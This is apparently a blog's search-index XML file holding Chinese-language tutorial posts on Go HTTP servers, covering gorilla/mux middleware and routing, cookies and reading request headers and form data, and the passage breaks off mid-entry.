<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>GoHTTPServe—Middleware</title>
      <link href="2020/11/08/GoHTTPServe%E2%80%94Middleware/"/>
      <url>2020/11/08/GoHTTPServe%E2%80%94Middleware/</url>
      
        <content type="html"><![CDATA[<h2 id="一、中间件（Middleware）"><a href="#一、中间件（Middleware）" class="headerlink" title="一、中间件（Middleware）"></a>一、中间件（Middleware）</h2><p>中间件在调用<code>Handler</code>处理请求之前被执行，通常用于在处理请求前执行某些特定功能的代码，例如<code>Header</code>操纵、日志记录、权限认证和<code>ResponseWriter</code>劫持等等。</p><p>中间件（<code>Middleware</code>）的原理是装饰器模式，即将<code>Handler</code>传入装饰器中进行封装，然后返回新的<code>Handler</code>。</p><img src="/2020/11/08/GoHTTPServe%E2%80%94Middleware/bV3mey" alt="img" style="zoom:50%;"><p>通常每个中间件只处理一件事情，完成后将其传递给另一个中间件或最终处理程序。</p><p><strong>先注册的装饰器最后被执行。</strong></p><h2 id="二、gorilla-mux中间件实现原理"><a href="#二、gorilla-mux中间件实现原理" class="headerlink" title="二、gorilla\mux中间件实现原理"></a>二、<code>gorilla\mux</code>中间件实现原理</h2><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> Router <span class="token keyword">struct</span> <span class="token punctuation">{</span>    <span class="token operator">...</span><span class="token operator">...</span>    <span class="token comment" spellcheck="true">// Slice of middlewares to be called after a match is found</span>    middlewares <span class="token punctuation">[</span><span class="token punctuation">]</span>middleware    <span class="token operator">...</span><span class="token operator">...</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// middleware interface is anything which implements a MiddlewareFunc named Middleware.</span><span class="token keyword">type</span> middleware <span class="token keyword">interface</span> <span class="token punctuation">{</span>    <span class="token function">Middleware</span><span class="token punctuation">(</span>handler http<span class="token punctuation">.</span>Handler<span class="token punctuation">)</span> http<span class="token punctuation">.</span>Handler<span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token punctuation">(</span>r <span class="token operator">*</span>Router<span class="token punctuation">)</span> <span class="token function">Use</span><span class="token punctuation">(</span>mwf <span class="token operator">...</span>MiddlewareFunc<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> fn <span class="token operator">:=</span> <span class="token keyword">range</span> mwf <span class="token punctuation">{</span>        r<span class="token punctuation">.</span>middlewares <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>middlewares<span class="token punctuation">,</span> fn<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">type</span> MiddlewareFunc <span class="token keyword">func</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>Handler<span class="token punctuation">)</span> http<span class="token punctuation">.</span>Handler<span class="token comment" spellcheck="true">// Middleware allows MiddlewareFunc to implement the middleware interface.</span><span class="token keyword">func</span> <span class="token punctuation">(</span>mw MiddlewareFunc<span class="token punctuation">)</span> <span class="token function">Middleware</span><span class="token punctuation">(</span>handler http<span class="token punctuation">.</span>Handler<span class="token punctuation">)</span> http<span class="token punctuation">.</span>Handler <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">mw</span><span class="token punctuation">(</span>handler<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//调用自身</span><span class="token punctuation">}</span></code></pre><ul><li><code>mux.Router</code>中定义了<code>middlewares</code>切片用于存储中间件，中间件接口要求实现<code>Middleware(handler http.Handler) http.Handler</code>方法，该方法是中间件的核心，实现对传入的原<code>Handler</code>进行封装，返回新的<code>Handler</code>。</li><li><code>mux.Router</code>的<code>Use()</code>方法用于添加要使用的中间件，传入的参数类型为<code>MiddlewareFunc</code>，其实现了中间件接口。其实现接口的<code>Middleware()</code>实质上是调用的<code>MiddlewareFunc</code>自身。</li></ul><h5 id="执行流程解析"><a href="#执行流程解析" class="headerlink" title="执行流程解析"></a><strong>执行流程解析</strong></h5><p>首先，我们知道，所有的请求一开始均由分发器（<code>mux.Router</code>）的<code>ServerHTTP()</code>来进行请求分发，在方法中调用了<code>Match()</code>方法进行路由查找。</p><ul><li><p><code>*mux.Router.ServeHTTP()</code></p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>r <span class="token operator">*</span>Router<span class="token punctuation">)</span> <span class="token function">ServeHTTP</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> req <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token operator">...</span><span class="token operator">...</span>    <span class="token keyword">var</span> match RouteMatch    <span class="token keyword">var</span> handler http<span class="token punctuation">.</span>Handler    <span class="token keyword">if</span> r<span class="token punctuation">.</span><span class="token function">Match</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> <span class="token operator">&amp;</span>match<span class="token punctuation">)</span> <span class="token punctuation">{</span>        handler <span class="token operator">=</span> match<span class="token punctuation">.</span>Handler        req <span class="token operator">=</span> <span class="token function">requestWithVars</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> match<span class="token punctuation">.</span>Vars<span class="token punctuation">)</span>        req <span class="token operator">=</span> <span class="token function">requestWithRoute</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> match<span class="token punctuation">.</span>Route<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token operator">...</span><span class="token operator">...</span>    handler<span class="token punctuation">.</span><span class="token function">ServeHTTP</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> req<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li></ul><p><code>*Route.Match()</code>会遍历所有的路由（<code>Route</code>），并调用<code>Route.Match()</code>逐一进行匹配查找。如果存在匹配项，就会遍历所有中间件对查找到的原<code>Handler</code>进行封装。</p><ul><li><p><code>*mux.Router.Match()</code></p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>r <span class="token operator">*</span>Router<span class="token punctuation">)</span> <span class="token function">Match</span><span class="token punctuation">(</span>req <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">,</span> match <span class="token operator">*</span>RouteMatch<span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> route <span class="token operator">:=</span> <span class="token keyword">range</span> r<span class="token punctuation">.</span>routes <span class="token punctuation">{</span>        <span class="token keyword">if</span> route<span class="token punctuation">.</span><span class="token function">Match</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> match<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// Build middleware chain if no error was found</span>            <span class="token keyword">if</span> match<span class="token punctuation">.</span>MatchErr <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>                <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token function">len</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>middlewares<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span> <span class="token punctuation">{</span>                    match<span class="token punctuation">.</span>Handler <span class="token operator">=</span> r<span class="token punctuation">.</span>middlewares<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">Middleware</span><span class="token punctuation">(</span>match<span class="token punctuation">.</span>Handler<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//遍历中间件对匹配项的原Handler进行逐层封装</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> <span class="token boolean">true</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token operator">...</span><span class="token operator">...</span><span class="token punctuation">}</span></code></pre></li></ul><h5 id="例子：日志记录中间件"><a href="#例子：日志记录中间件" class="headerlink" title="例子：日志记录中间件"></a><strong>例子：日志记录中间件</strong></h5><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">hello</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    name <span class="token operator">:=</span> mux<span class="token punctuation">.</span><span class="token function">Vars</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span>    fmt<span class="token punctuation">.</span><span class="token function">Fprintf</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token string">"Hello %s"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">logger</span><span class="token punctuation">(</span>next http<span class="token punctuation">.</span>Handler<span class="token punctuation">)</span> http<span class="token punctuation">.</span>Handler <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//中间件要返回一个新的Handler，在新的Handler中的最后调用原Handler，实现在原先的处理逻辑中添加新功能。</span>    h <span class="token operator">:=</span> <span class="token keyword">func</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//本中间件实现记录请求URL和客户端IP：PORT的功能</span>        log<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>URL<span class="token punctuation">.</span>Path<span class="token punctuation">,</span> r<span class="token punctuation">.</span>RemoteAddr<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">//调用原Handler或是下一个中间件。</span>        next<span class="token punctuation">.</span><span class="token function">ServeHTTP</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> r<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> http<span class="token punctuation">.</span><span class="token function">HandlerFunc</span><span class="token punctuation">(</span>h<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    router <span class="token operator">:=</span> mux<span class="token punctuation">.</span><span class="token function">NewRouter</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    router<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/hello/{name}"</span><span class="token punctuation">,</span> hello<span class="token punctuation">)</span>    router<span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span>logger<span class="token punctuation">)</span>    http<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> router<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Middldware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoHTTPServe—gorilla_mux</title>
      <link href="2020/11/08/GoHTTPServe%E2%80%94gorilla-mux/"/>
      <url>2020/11/08/GoHTTPServe%E2%80%94gorilla-mux/</url>
      
        <content type="html"><![CDATA[<h2 id="一、gorilla-mux"><a href="#一、gorilla-mux" class="headerlink" title="一、gorilla\mux"></a>一、gorilla\mux</h2><blockquote><p>Package <code>gorilla/mux</code> implements a request router and dispatcher for matching incoming requests to their respective handler.</p></blockquote><p>类似于标准库中的 <code>http.ServeMux</code>，<code>gorilla\mux</code>包为我们提供了<code>mux.Router</code>来管理URL与<code>Handler</code>的对应关系以及分发请求给各自的<code>Handler</code>处理。而且相比于<code>http.ServerMux</code>拥有更丰富的功能。</p><ul><li><p>安装：<code>go get -u github.com/gorilla/mux</code></p></li><li><p><strong><code>mux.Router</code></strong></p><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> Router <span class="token keyword">struct</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Configurable Handler to be used when no route matches.</span>    NotFoundHandler http<span class="token punctuation">.</span>Handler    <span class="token comment" spellcheck="true">// Configurable Handler to be used when the request method does not match the route.</span>    MethodNotAllowedHandler http<span class="token punctuation">.</span>Handler    <span class="token comment" spellcheck="true">// Routes to be matched, in order.</span>    routes <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">*</span>Route    <span class="token comment" spellcheck="true">// Routes by name for URL building.</span>    namedRoutes <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token operator">*</span>Route    KeepContext <span class="token builtin">bool</span>    <span class="token comment" spellcheck="true">// Slice of middlewares to be called after a match is found</span>    middlewares <span class="token punctuation">[</span><span class="token punctuation">]</span>middleware    <span class="token comment" spellcheck="true">// configuration shared with `Route`</span>    routeConf<span class="token punctuation">}</span></code></pre><ul><li><p><code>mux.NewRouter()</code></p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// NewRouter returns a new router instance.</span><span class="token keyword">func</span> <span class="token function">NewRouter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span>Router <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token operator">&amp;</span>Router<span class="token punctuation">{</span>namedRoutes<span class="token punctuation">:</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token operator">*</span>Route<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><ul><li><p>例子：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">home</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Fprintln</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token string">"Home Page"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    router <span class="token operator">:=</span> mux<span class="token punctuation">.</span><span class="token function">NewRouter</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    router<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> home<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//类似于http.HandleFunc()函数一样的工作方式。</span>    http<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> router<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li></ul></li></ul></li></ul><h2 id="二、路由规则"><a href="#二、路由规则" class="headerlink" title="二、路由规则"></a>二、路由规则</h2><p>可以基于URL中的<code>host</code>、<code>path</code>，<code>path prefix</code>，<code>scheme</code>、 <code>header</code>、<code>query</code>以及 <code>HTTP Method</code> 进行路由匹配，或是使用自定义匹配器。</p><h5 id="正则规则路由"><a href="#正则规则路由" class="headerlink" title="正则规则路由"></a><strong>正则规则路由</strong></h5><ul><li><p>路由匹配规则中可以设置变量占位符，占位符可以只设置变量，也可以同时设置变量和正则表示式：<code>{name}</code> or <code>{name:pattern}</code>. </p></li><li><p>If a regular expression pattern is not defined, the matched variable will be anything until the next slash. </p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">hello</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    name <span class="token operator">:=</span> mux<span class="token punctuation">.</span><span class="token function">Vars</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span>    fmt<span class="token punctuation">.</span><span class="token function">Fprintf</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token string">"Hello %s"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">showAge</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    age <span class="token operator">:=</span> mux<span class="token punctuation">.</span><span class="token function">Vars</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"age"</span><span class="token punctuation">]</span>    fmt<span class="token punctuation">.</span><span class="token function">Fprintf</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token string">"AGE: %s"</span><span class="token punctuation">,</span> age<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    router <span class="token operator">:=</span> mux<span class="token punctuation">.</span><span class="token function">NewRouter</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    router<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/{name}"</span><span class="token punctuation">,</span> hello<span class="token punctuation">)</span>    router<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/age/{age:[0-9]+}"</span><span class="token punctuation">,</span> showAge<span class="token punctuation">)</span>    http<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> router<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li></ul><h5 id="其它匹配规则"><a href="#其它匹配规则" class="headerlink" title="其它匹配规则"></a><strong>其它匹配规则</strong></h5><pre class=" language-go"><code class="language-go">r <span class="token operator">:=</span> mux<span class="token punctuation">.</span><span class="token function">NewRouter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//基于HTTP Host头匹配</span>r<span class="token punctuation">.</span><span class="token function">Host</span><span class="token punctuation">(</span><span class="token string">"www.example.com"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//基于路径前缀</span>r<span class="token punctuation">.</span><span class="token function">PathPrefix</span><span class="token punctuation">(</span><span class="token string">"/products/"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//基于HTTP 请求方法</span>r<span class="token punctuation">.</span><span class="token function">Methods</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//基于请求协议</span>r<span class="token punctuation">.</span><span class="token function">Schemes</span><span class="token punctuation">(</span><span class="token string">"https"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//基于HTTP Header</span>r<span class="token punctuation">.</span><span class="token function">Headers</span><span class="token punctuation">(</span><span class="token string">"X-Requested-With"</span><span class="token punctuation">,</span> <span class="token string">"XMLHttpRequest"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//基于请求参数</span>r<span class="token punctuation">.</span><span class="token function">Queries</span><span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span></code></pre><ul><li><p>上面的匹配规则还支持<code>链式</code>形式，即多个规则同时应用。</p></li><li><p>匹配规则方法在调用后都会返回<code>*Route</code>，可以在调用之后调用<code>Handler()</code>方法设置处理函数。</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// Handler sets a handler for the route.</span><span class="token keyword">func</span> <span class="token punctuation">(</span>r <span class="token operator">*</span>Route<span class="token punctuation">)</span> <span class="token function">Handler</span><span class="token punctuation">(</span>handler http<span class="token punctuation">.</span>Handler<span class="token punctuation">)</span> <span class="token operator">*</span>Route <span class="token punctuation">{</span>    <span class="token keyword">if</span> r<span class="token punctuation">.</span>err <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        r<span class="token punctuation">.</span>handler <span class="token operator">=</span> handler    <span class="token punctuation">}</span>    <span class="token keyword">return</span> r<span class="token punctuation">}</span></code></pre></li></ul><h5 id="子路由"><a href="#子路由" class="headerlink" title="子路由"></a><strong>子路由</strong></h5><p>若有多条路由基于同一规则，写多次很麻烦且不美观，此时可以使用子路由。</p><pre class=" language-go"><code class="language-go">router <span class="token operator">:=</span> mux<span class="token punctuation">.</span><span class="token function">NewRouter</span><span class="token punctuation">(</span><span class="token punctuation">)</span>subrt1 <span class="token operator">:=</span> router<span class="token punctuation">.</span><span class="token function">PathPrefix</span><span class="token punctuation">(</span><span class="token string">"/wife"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Subrouter</span><span class="token punctuation">(</span><span class="token punctuation">)</span>subrt1<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> get_wifes<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">// /wife/</span>subrt1<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/add/{name}"</span><span class="token punctuation">,</span> add_wifes<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// /wife/add/any</span>subrt2 <span class="token operator">:=</span> router<span class="token punctuation">.</span><span class="token function">Host</span><span class="token punctuation">(</span><span class="token string">"a4ua.cool"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Subrouter</span><span class="token punctuation">(</span><span class="token punctuation">)</span>subrt2<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> home<span class="token punctuation">)</span>subrt2<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/whatever"</span><span class="token punctuation">,</span> whatever<span class="token punctuation">)</span></code></pre><h5 id="静态文件"><a href="#静态文件" class="headerlink" title="静态文件"></a><strong>静态文件</strong></h5><pre class=" language-go"><code class="language-go">r <span class="token operator">:=</span> mux<span class="token punctuation">.</span><span class="token function">NewRouter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// This will serve files under http://localhost:8000/static/&lt;filename></span>r<span class="token punctuation">.</span><span class="token function">PathPrefix</span><span class="token punctuation">(</span><span class="token string">"/static/"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Handler</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span><span class="token function">StripPrefix</span><span class="token punctuation">(</span><span class="token string">"/static/"</span><span class="token punctuation">,</span> http<span class="token punctuation">.</span><span class="token function">FileServer</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span><span class="token function">Dir</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gorilla\mux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoHTTPServer—Cookie_Session</title>
      <link href="2020/11/08/GoHTTPServer%E2%80%94Cookie-Session/"/>
      <url>2020/11/08/GoHTTPServer%E2%80%94Cookie-Session/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Cookie、Session工作原理"><a href="#一、Cookie、Session工作原理" class="headerlink" title="一、Cookie、Session工作原理"></a>一、Cookie、Session工作原理</h2><blockquote><p>首先，<code>http</code>是无状态的，即每一次请求都是独立的，毫无关联，互不影响。一次请求(<code>HTTP Request</code>)，一次响应(<code>HTTP Response</code>)，仅此而已。而<code>Cookie</code>和<code>Session</code>就是为了解决这种请求之间的<strong>独立性</strong>，而引进的会话机制。</p></blockquote><p>参考连接：</p><p><a href="https://www.cnblogs.com/andy-zhou/p/5360107.html" target="_blank" rel="noopener">https://www.cnblogs.com/andy-zhou/p/5360107.html</a></p><p><a href="https://blog.csdn.net/playboyanta123/article/details/79464684" target="_blank" rel="noopener">https://blog.csdn.net/playboyanta123/article/details/79464684</a></p><h2 id="二、http-Cookie"><a href="#二、http-Cookie" class="headerlink" title="二、http.Cookie"></a>二、http.Cookie</h2><p><code>net\http</code>包使用<code>http.Cookie</code>来表示一个<code>Cookie</code>键值对。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> Cookie <span class="token keyword">struct</span> <span class="token punctuation">{</span>    Name  <span class="token builtin">string</span>    Value <span class="token builtin">string</span>    Path       <span class="token builtin">string</span>    <span class="token comment" spellcheck="true">// optional</span>    Domain     <span class="token builtin">string</span>    <span class="token comment" spellcheck="true">// optional</span>    Expires    time<span class="token punctuation">.</span>Time <span class="token comment" spellcheck="true">// optional</span>    RawExpires <span class="token builtin">string</span>    <span class="token comment" spellcheck="true">// for reading cookies only</span>    <span class="token comment" spellcheck="true">// MaxAge=0 means no 'Max-Age' attribute specified.</span>    <span class="token comment" spellcheck="true">// MaxAge&lt;0 means delete cookie now, equivalently 'Max-Age: 0'</span>    <span class="token comment" spellcheck="true">// MaxAge>0 means Max-Age attribute present and given in seconds</span>    MaxAge   <span class="token builtin">int</span>    Secure   <span class="token builtin">bool</span>    HttpOnly <span class="token builtin">bool</span>    SameSite SameSite    Raw      <span class="token builtin">string</span>    Unparsed <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span> <span class="token comment" spellcheck="true">// Raw text of unparsed attribute-value pairs</span><span class="token punctuation">}</span></code></pre><ul><li><code>Expires</code>与<code>MaxAge</code>区别：<ul><li><code>MaxAge</code>是为了取代<code>Expires</code>而产生的。</li><li><code>Expires</code>指定的是<code>Cookie</code>过期的绝对日期时间，如果客户端的系统时间设置错误，则会导致<code>expires</code>无法正确生效。</li><li><code>MaxAge</code>类似于一个超时计时器。</li></ul></li></ul><p><strong><code>http.SetCookie()</code></strong></p><p><code>net\http</code>包提供了<code>http.SetCokie()</code>方法来设置<code>Set-Cookie</code>，一次只能设置一个<code>Cookie</code>键值对，若要设置多个键值对则调用多次<code>SetCookie()</code>方法。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">SetCookie</span><span class="token punctuation">(</span>w ResponseWriter<span class="token punctuation">,</span> cookie <span class="token operator">*</span>Cookie<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> v <span class="token operator">:=</span> cookie<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> v <span class="token operator">!=</span> <span class="token string">""</span> <span class="token punctuation">{</span>        w<span class="token punctuation">.</span><span class="token function">Header</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">"Set-Cookie"</span><span class="token punctuation">,</span> v<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cookie </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go Package—http_server_header_get_post_data</title>
      <link href="2020/11/06/Go-Package%E2%80%94http-server-header-get-post-data/"/>
      <url>2020/11/06/Go-Package%E2%80%94http-server-header-get-post-data/</url>
      
        <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>总结记录HTTP服务端获取客户端提交的数据的方式，包括获取<code>HTTP Header</code>、<code>GET</code>、<code>POST</code>等数据。</p><p><code>HTTP Request</code>消息被封装在<code>http.Request</code>结构体中，主要围绕其进行展开。</p><h2 id="二、HTTP-Header"><a href="#二、HTTP-Header" class="headerlink" title="二、HTTP Header"></a>二、HTTP Header</h2><p>在<code>http.Request</code>结构体中，使用<code>Header</code>数据结构来存储HTTP头部，其本质是一个<code>map</code>。</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// A Header represents the key-value pairs in an HTTP header.</span><span class="token comment" spellcheck="true">//</span><span class="token comment" spellcheck="true">// The keys should be in canonical form, as returned by CanonicalHeaderKey.</span><span class="token keyword">type</span> Header <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span></code></pre><ul><li><p><strong><code>Header</code>提供的方法有：</strong></p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">//主要用于http.Client端。</span><span class="token keyword">func</span> <span class="token punctuation">(</span>h Header<span class="token punctuation">)</span> <span class="token function">Add</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token keyword">func</span> <span class="token punctuation">(</span>h Header<span class="token punctuation">)</span> <span class="token function">Set</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token keyword">func</span> <span class="token punctuation">(</span>h Header<span class="token punctuation">)</span> <span class="token function">Del</span><span class="token punctuation">(</span>key <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//主要用于http.Server端获取HTTP头部值。</span><span class="token keyword">func</span> <span class="token punctuation">(</span>h Header<span class="token punctuation">)</span> <span class="token function">Get</span><span class="token punctuation">(</span>key <span class="token builtin">string</span><span class="token 